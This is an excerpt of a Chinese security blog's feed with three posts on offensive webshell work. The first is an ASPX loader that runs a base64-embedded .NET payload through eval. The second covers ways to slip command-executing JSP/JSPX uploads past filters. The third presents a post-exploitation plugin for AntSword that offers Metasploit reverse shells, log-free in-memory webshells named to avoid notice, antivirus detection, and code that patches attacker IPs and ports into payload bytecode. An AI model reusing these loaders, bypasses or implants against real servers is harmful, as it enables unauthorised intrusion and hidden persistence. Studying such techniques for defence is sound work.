EAmgEGABkAmgEKACkAmgEQADEAmgEQADkAmgEQAEEAmgEQAEkAmgEQAFEAmgEQAFkAmgEQAGEAmgEVAGkAmgEQAHEAmgEQAIEAFwIaAHkAmgEGAC4ACwAuAC4AEwA3AC4AGwBWAC4AIwBfAC4AKwBvAC4AMwBvAC4AOwBvAC4AQwBfAC4ASwB1AC4AUwBvAC4AWwBvAC4AYwCNAC4AawC3AASAAAABAAAAAAAAAAAAAAAAABMAAAACAAAAAAAAAAAAAAAgAAoAAAAAAAIAAAAAAAAAAAAAACAAfQEAAAAAAAAAPE1vZHVsZT4AbXNjb3JsaWIAQW50UGF5bG9hZABHdWlkQXR0cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAG9iagBBbnRQYXlsb2FkLmRsbABTeXN0ZW0AU3lzdGVtLlJlZmxlY3Rpb24AUnVuAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFcXVhbHMAUHJvY2VzcwBPYmplY3QAU3RhcnQAAAAAABFjAGEAbABjAC4AZQB4AGUAAAA945IL3EDlTKxPqJUA/SMAAAQgAQEIAyAAAQUgAQEREQQgAQEOBCABAQIFAAESQQ4It3pcVhk04IkEIAECHAgBAAgAAAAAAB4BAAEAVAIWV3JhcE5vbkV4Y2VwdGlvblRocm93cwEIAQACAAAAAAAPAQAKQW50UGF5bG9hZAAABQEAAAAAFwEAEkNvcHlyaWdodCDCqSAgMjAyMQAAKQEAJDUzMTY4RUI2LThBMTgtNDAzRS1CQzQ2LUJGNTY1RkRBMUFFNgAADAEABzEuMC4wLjAAAAAAAAD9kA9gAAAAAAIAAAAcAQAAxCUAAMQHAABSU0RTOaWA97zcx0qN4uxJUEp93wEAAABEOlxSaWRlclByb2plY3RzXERsbFRlc3RcQW50UGF5bG9hZFxvYmpcUmVsZWFzZVxBbnRQYXlsb2FkLnBkYgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgnAAAAAAAAAAAAACInAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAUJwAAAAAAAAAAAAAAAF9Db3JEbGxNYWluAG1zY29yZWUuZGxsAAAAAAD/JQAgABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAAAsAwAAAAAAAAAAAAAsAzQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEjAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAaAIAAAEAMAAwADAAMAAwADQAYgAwAAAAGgABAAEAQwBvAG0AbQBlAG4AdABzAAAAAAAAACIAAQABAEMAbwBtAHAAYQBuAHkATgBhAG0AZQAAAAAAAAAAAD4ACwABAEYAaQBsAGUARABlAHMAYwByAGkAcAB0AGkAbwBuAAAAAABBAG4AdABQAGEAeQBsAG8AYQBkAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA+AA8AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEEAbgB0AFAAYQB5AGwAbwBhAGQALgBkAGwAbAAAAAAASAASAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAQwBvAHAAeQByAGkAZwBoAHQAIACpACAAIAAyADAAMgAxAAAAKgABAAEATABlAGcAYQBsAFQAcgBhAGQAZQBtAGEAcgBrAHMAAAAAAAAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBuAHQAUABhAHkAbABvAGEAZAAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbgB0AFAAYQB5AGwAbwBhAGQAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwquot;; </span><br><span class="line">    var type = Type.GetType(&quot;AntPayload.Run&quot;);</span><br><span class="line">    if (type != null)</span><br><span class="line">    &#123;</span><br><span class="line">        Response.Write(type + &quot; exists&quot;);</span><br><span class="line">        //var obj=System.Activator.CreateInstance(type);</span><br><span class="line">        //obj.Equals(&quot;&quot;);</span><br><span class="line">        var assembly = System.Reflection.Assembly.GetExecutingAssembly();</span><br><span class="line">        var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">        obj.Equals(&quot;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        Response.Write(type + &quot; not exists&quot;);</span><br><span class="line">        var myAssebly = System.Reflection.Assembly.Load(Convert.FromBase64String(Payload));</span><br><span class="line">        var myPaylaod = myAssebly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">        myPaylaod.Equals(&quot;&quot;);</span><br><span class="line">        //myAssebly.GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(&quot;&quot;);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p>发现 Type.GetType 永远为undefined。以为是函数用的不对，后来又换了System.Reflection.Assembly.GetCallingAssembly().GetType，System.Reflection.Assembly.GetExecutingAssembly().GetType都不行。</p><p>接着发现虽然把代码直接写在jscript中可以多次稳定触发，如果把以上代码通过eval打进入仍然会报上面类型转换的错误。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611646712047-0bef66ad-7558-4637-9cb8-6c7f971a73c9.png" alt="image.png"></p><p>另外还发现一些奇怪的地方，如果直接代码写在jscript文件中可以用这种写法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var obj=System.Activator.CreateInstance(type);</span><br><span class="line">obj.Equals(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>但是如果通过eval传进去就只能用这种写法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var assembly = System.Reflection.Assembly.GetExecutingAssembly();</span><br><span class="line">var obj = assembly.CreateInstance(&quot;AntPayload.Run&quot;);</span><br><span class="line">obj.Equals(&quot;&quot;);</span><br></pre></td></tr></table></figure><p>否则会报如下错误，谷歌也没查到怎么解决，神秘。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611648974375-35bf8f84-b053-4b04-84dd-9a4f405c2543.png" alt="image.png"></p><h2 id="问题解决">问题解决</h2><p>试了很多办法都失败了，后来谷歌搜到了一篇<a href="https://evolpin.wordpress.com/2012/11/11/invalidcastexception-when-using-assembly-loadfile/" target="_blank" rel="noopener">2012年的博客</a>遇到了同样的问题，大概意思是说两次的assembly被加载到了不同的上下文中，所以被当作成为不同的类，无法进行类型转换。</p><p>跟北辰师傅研究了一番后，北辰师傅想到一种方法：把第一次加载后的assembly的引用给存到当前Application的上下文中，即HttpContext.Current.Application这个类里面，然后再通过Application.Get(“ant”)拿到引用，然后反射，再获取实例化，这样就可以解决上下文不同的问题。</p><p>payload修改如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var Payload=&quot;xxxxx&quot;;</span><br><span class="line">HttpContext.Current.Application.Add(&quot;ant&quot;, System.Reflection.Assembly.Load(Convert.FromBase64String(Payload)));</span><br><span class="line">HttpContext.Current.Application.Get(&quot;ant&quot;).GetType(&quot;AntPayload.Run&quot;).GetConstructor(new Type[0]).Invoke(null).Equals(this);</span><br></pre></td></tr></table></figure><p>然后通过eval打过去，此时就可以多次稳定触发payload了。</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1611647475255-93c68208-03b8-4790-bf97-a6f60b9e0215.png" alt="image.png"></p><h2 id="最后">最后</h2><p>特别感谢北辰师傅的交流探讨！</p><p><a href="http://xn--7br39t.net" target="_blank" rel="noopener">初学.net</a>，有些地方是凭借自己的理解写的，如果有说的不对的地方欢迎指出，以免误导他人。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;&lt;p&gt;最近想要给As-Exploits增加aspx类型的支持，就研究了一下冰蝎跟哥斯拉的实现。&lt;/p&gt;&lt;p&gt;由于冰蝎跟哥斯拉都采用的C#类型的shell，
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>星球问答：一次jsp上传绕过的思考</title>
    <link href="https://yzddmr6.com/posts/jsp-webshell-upload-bypass/"/>
    <id>https://yzddmr6.com/posts/jsp-webshell-upload-bypass/</id>
    <published>2021-01-15T03:22:15.000Z</published>
    <updated>2021-06-15T13:50:54.296Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="背景">背景</h2><p>前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：</p><ol><li>jsp的站，可以任意文件上传</li><li>上传jsp会把&lt;%中的&lt;给转义掉</li><li>上传jspx会把<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>到&lt;/jsp:scriptlet&gt;中的内容替换为空</li></ol><p>问有什么突破办法？</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679190674-baace7f2-e763-4cb2-8695-bed0661fc1e5.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679220546-2dfa9031-8abc-4f16-a4db-2a6b3e0c2c1d.png" alt="image.png"></p><p>当时研究了一下后jsp和jspx各给了一个解决方案，后来发到星球里后@hosch3n师傅又提出了一种新的方案，tql</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1616582626934-e9fd6f02-24b0-47b6-b814-22c972c359b9.png" alt="image.png"></p><h2 id="解决方案">解决方案</h2><p>其实问题等价于：</p><ol><li>jsp不使用&lt;% %&gt;标签如何执行命令</li><li>jspx不使用<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a> &lt;/jsp:scriptlet&gt;如何执行命令</li></ol><h3 id="jsp利用EL表达式绕过">jsp利用EL表达式绕过</h3><p>jsp是默认解析el表达式的，并且在没有jsp标签的情况下也可以直接执行，这样就可以绕过jsp的限制。</p><p>星球里面@Gh0stFx也提到了这一点</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679796286-4312913e-9ca9-42ba-9ba0-20352e9572a6.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610679816568-bfe65530-8ece-40ee-b6af-e4228373fa92.png" alt="image.png"></p><h3 id="jspx利用命名空间绕过">jspx利用命名空间绕过</h3><p>因为jspx实际上是jsp的xml写法，所以继承了xml的所有特性，例如cdata跟html实体编码等，同样也继承了命名空间的特性。</p><p><a href="https://www.runoob.com/xml/xml-namespaces.html" target="_blank" rel="noopener">https://www.runoob.com/xml/xml-namespaces.html</a></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680285750-0f35e6cf-e02b-4a65-8c75-f6170768fbfd.png" alt="image.png"></p><p>在<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>这个标签中，jsp就是默认的命名空间，但是实际上可以随意替换成其他名字</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680407208-7224f65a-665e-413f-8f4e-b6a90fea8c4f.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680395767-7be98260-0a6d-4bd1-b5f7-8ef901c0b6dc.png" alt="image.png"></p><p>这样就绕过了对<a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a>的过滤</p><h3 id="jspx利用jsp-expression绕过">jspx利用<a href="jsp:expression" target="_blank" rel="noopener">jsp:expression</a>绕过</h3><p>在jsp中可以利用表达式绕过，那么jspx中同样也可以，以下是jsp跟jspx语法的对照：</p><table><thead><tr><th></th><th>JSP语法</th><th>JSP document语法</th></tr></thead><tbody><tr><td>Page Directive</td><td>&lt;%@ page %&gt;</td><td>&lt;jsp:directive.page /&gt;</td></tr><tr><td>Include Directive</td><td>&lt;%@ include %&gt;</td><td>&lt;jsp:directive.include /&gt;</td></tr><tr><td>Tag Library Directive</td><td>&lt;%@ taglib %&gt;</td><td>xmlns:prefix=”Library URI”</td></tr><tr><td>Declartion</td><td>&lt;%! … %&gt;</td><td><a href="jsp:declaration" target="_blank" rel="noopener">jsp:declaration</a> … &lt;/jsp:declaration&gt;</td></tr><tr><td>Scriplet</td><td>&lt;% … %&gt;</td><td><a href="jsp:scriptlet" target="_blank" rel="noopener">jsp:scriptlet</a> … &lt;/jsp:scriptlet&gt;</td></tr><tr><td>Expression</td><td>&lt;%= … %&gt;</td><td><a href="jsp:expression" target="_blank" rel="noopener">jsp:expression</a> … &lt;/jsp:expression&gt;</td></tr><tr><td>Comment</td><td>&lt;%-- … --%&gt;</td><td></td></tr></tbody></table><p>这个方法是@hosch3n师傅提出来的，把表达式写到jspx中，同样可以达到执行命令的目的</p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680526168-55b3cb88-20e0-42b6-8e8a-d636a19d3df0.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2021/png/1599908/1610680545282-40414186-2ba2-4c30-aca0-ba88fb66946d.png" alt="image.png"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;&lt;h2 id=&quot;背景&quot;&gt;背景&lt;/h2&gt;&lt;p&gt;前几天有个小伙伴做项目的时候遇到一个问题来问我，大概情况如下：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;jsp的站，可以任意文件上传&lt;/li&gt;&lt;li&gt;上传jsp会把&amp;
      
    
    </summary>
    
    
      <category term="技术文章" scheme="https://yzddmr6.com/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="bypass" scheme="https://yzddmr6.com/tags/bypass/"/>
    
  </entry>
  
  <entry>
    <title>As-Exploits: 中国蚁剑后渗透框架</title>
    <link href="https://yzddmr6.com/posts/as-exploits/"/>
    <id>https://yzddmr6.com/posts/as-exploits/</id>
    <published>2020-12-01T12:49:48.000Z</published>
    <updated>2020-12-01T12:51:51.088Z</updated>
    
    <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"><h2 id="前言">前言</h2><p>冰蝎跟哥斯拉都有了各自的一些后渗透模块，然而蚁剑这一块基本还是空缺，所以就萌生出来做一个蚁剑的后渗透框架插件的想法。</p><p>目前插件的定位是蚁剑的一个微内核拓展模块，可以迅速做到payload的工程化，不用过多时间浪费在插件的结构上。目前的As-Exlpoits各部分之间基本做到了解耦，新增一个payload只需要两步：1.填写payload，2. 画一个表单。其余发包，回显处理等事情框架会自动帮你实现。想要自定义的话只需要继承父类然后重写对应方法即可。</p><p>因为http是无状态的，webshell能做的事情其实很有限，所以插件功能的重点主要放在msf，nmap等其他工具的联动上面，把专业的事情交给专业的工具去做。</p><h2 id="总体设计">总体设计</h2><p>一个模块在初始化之后的流程大概是这样</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606652867566-6b210ead-d80c-47dd-98a7-665c853568fe.png" alt="image.png"></p><p>当exploit事件发生时，会调用getArgs跟genPayload函数来组合成最后的payload，默认将回显数据发送到编辑框里。</p><h2 id="模块介绍">模块介绍</h2><p>简单的塞一些模块，没错我就是缝合怪。</p><h3 id="基本信息">基本信息</h3><p>获取当前服务端信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650769575-c855d15c-8811-4520-84c5-7bd450e4f697.png" alt="image-20201123102429650.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650778133-55aa040b-1963-473e-9a45-5f25085b1099.png" alt="image-20201123102711289.png"></p><h3 id="反弹Shell">反弹Shell</h3><p>跟MSF联动，与冰蝎和哥斯拉相比新增了bind类型的payload。</p><p>目前支持以下类型：</p><ul><li>java/meterpreter/reverse_tcp</li><li>java/shell/reverse_tcp</li><li>java/meterpreter/bind_tcp</li><li>java/shell/bind_tcp</li><li>php/meterpreter/reverse_tcp</li><li>php/shell/reverse_tcp</li><li>php/meterpreter/bind_tcp</li><li>php/shell/bind_tcp<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650786779-b76d4dcd-03d1-4979-b570-68ffad4be705.png" alt="image-20201123102902564.png"></li></ul><h3 id="内存马">内存马</h3><p>一键打入内存Webshell。由于时间仓促，目前仅支持Servlet型内存马。核心payload修改自哥斯拉，继承了nolog的功能，即内存马不会在tomcat中留下日志。</p><p>可打入的内存马种类：</p><ul><li>AntSword</li><li>Behinder</li><li>Godzilla-Base64</li><li>reGerog<br>其中组件名称为注册的Servlet的名称，可以起一个具有迷惑性的名字来隐藏自己。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650793510-adf4ab51-0ad0-4e13-9fbf-a1a9c4eaca2b.png" alt="image-20201123103009090.png"></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606825609324-b7fd9eeb-42e1-485f-aae0-bd51904d0cfc.png" alt="image.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606825602296-92beffbe-1868-4988-9167-67a36656b66c.png" alt="image.png"></p><h3 id="内存马管理">内存马管理</h3><ul><li>获取当前Servlet</li><li>卸载指定Servlet</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650799085-931c8824-f0fe-4139-bcaa-7107f5dbf8b8.png" alt="image-20201123103108185.png"></p><h3 id="杀软识别">杀软识别</h3><blockquote><p>数据来源是key师傅的项目：<a href="https://github.com/gh0stkey/avList" target="_blank" rel="noopener">avList</a></p></blockquote><p>通过<code>tasklist /svc</code>获取当前进程列表，识别出其中的杀软。</p><p>目前支持手动跟自动两种获取方式：</p><ul><li><p>自动获取<br>自动执行系统命令<code>tasklist /svc</code>并分析回显数据。</p></li><li><p>手动获取<br>手动输入<code>tasklist /svc</code>的结果。</p></li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1606650806803-2da534df-fe43-43a0-87a2-d8601ef27585.png" alt="image-20201123103231582.png"></p><h2 id="如何用node修改java字节码">如何用node修改java字节码</h2><p>在本插件中所有额外参数都采用了直接修改字节码，而没有采用额外参数的方式来传参。蚁剑没有java环境，那么是如何做到用node修改字节码的呢？详细的例子可以看我博客这篇文章：<a href="https://yzddmr6.tk/posts/node-edit-java-class/" target="_blank" rel="noopener">无java环境修改字节码</a></p><p>其实我们的需求无非只是修改变量池中的一个字符串，并不需要asm框架那么强大的功能。java字节码常量池中共有14种类型，如下表格所示：</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604908580647-d7ddffab-f806-40b4-8ed7-e3da78932575.png" alt="image"></p><blockquote><p>注意上面的表格的单位是错的，应该是byte不是bit</p></blockquote><p>我们关注的应该是CONSTANT_utf8_info跟CONSTANT_String_info。如果变量是第一次被定义的时候是用CONSTANT_utf8_info标志，第二次使用的时候就变成了CONSTANT_String_info，即只需要tag跟面向字符串的索引。</p><p>也就是说关键的结构就是这个</p><p><img src="https://cdn.nlark.com/yuque/0/2020/png/1599908/1604909146524-fa3af1af-4b7b-4ae4-920e-02a4e8cedc84.png" alt="image"></p><p>其实跟PHP的序列化很相似，首先来个标志位表示变量的类型，然后是变量的长度，最后是变量的内容。</p><p>既然知道了其结构，那么修改的办法也就呼之欲出。除了修改变量的hex，只需要再把前面的变量长度给改一下就可以了。</p><p>把yan表哥的代码抽出来修改一下，yan表哥yyds。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">function replaceClassStringVar(b64code, oldvar, newvar) &#123;</span><br><span class="line">    let code = Buffer.from(b64code, &apos;base64&apos;);//解码</span><br><span class="line">    let hexcode = code.toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let hexoldvar = Buffer.from(oldvar).toString(&apos;hex&apos;);//转为16进制</span><br><span class="line">    let oldpos = hexcode.indexOf(hexoldvar);</span><br><span class="line">    if (oldpos &gt; -1) &#123;//判断字节码中是否包含目标字符串</span><br><span class="line">      let newlength = decimalToHex(newvar.length, 4);//计算新字符串长度</span><br><span class="line">      let retcode = `$&#123;hexcode.slice(0, oldpos - 4)&#125;$&#123;newlength&#125;$&#123;Buffer.from(newvar).toString(&apos;hex&apos;)&#125;$&#123;hexcode.slice(oldpos + hexoldvar.length)&#125;`;//把原来字节码的前后部分截出来，中间拼上新的长度跟内容</span><br><span class="line">      return Buffer.from(retcode, &apos;hex&apos;).toString(&apos;base64&apos;);//base64编码</span><br><span class="line">    &#125;</span><br><span class="line">    return b64code;</span><br><span class="line">  &#125;</span><br><span class="line">  function decimalToHex(d, padding) &#123;</span><br><span class="line">    var hex = Number(d).toString(16);</span><br><span class="line">    padding = typeof (padding) === &quot;undefined&quot; || padding === null ? padding = 2 : padding;</span><br><span class="line">    while (hex.length &lt; padding) &#123;</span><br><span class="line">      hex = &quot;0&quot; + hex;//小于padding长度就填充0</span><br><span class="line">    &#125;</span><br><span class="line">    return hex;</span><br><span class="line">  &#125;</span><br><span class="line">content=`xxxxxxxxxxxxx`//要替换的字节码</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetIP&apos;,&apos;192.168.88.129&apos;)</span><br><span class="line">content=replaceClassStringVar(content,&apos;targetPORT&apos;,&apos;9999&apos;)</span><br><span class="line">console.log(content)</span><br></pre></td></tr></table></figure><h2 id="编写模块">编写模块</h2><h3 id="父类Base">父类Base</h3><p>Base是所有模块的基类，放了一些默认的方法。</p><p>顺着代码来说吧。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br></pre></td><td class="code"><pre><span class="line">&quot;use strict&quot;;</span><br><span class="line"></span><br><span class="line">const LANG = require(&quot;../language&quot;); // 插件语言库</span><br><span class="line">const LANG_T = antSword[&quot;language&quot;][&quot;toastr&quot;]; // 通用通知提示</span><br><span class="line">const path = require(&quot;path&quot;);</span><br><span class="line">class Base &#123;</span><br><span class="line">  constructor(top) &#123;//获取顶层对象</span><br><span class="line">    this.top = top;</span><br><span class="line">    this.opt = this.top.opt;</span><br><span class="line">    this.shelltype = this.top.opt.type;</span><br><span class="line">    this.win = this.top.win;</span><br><span class="line">    this.payloadtype=&quot;default&quot;;</span><br><span class="line">    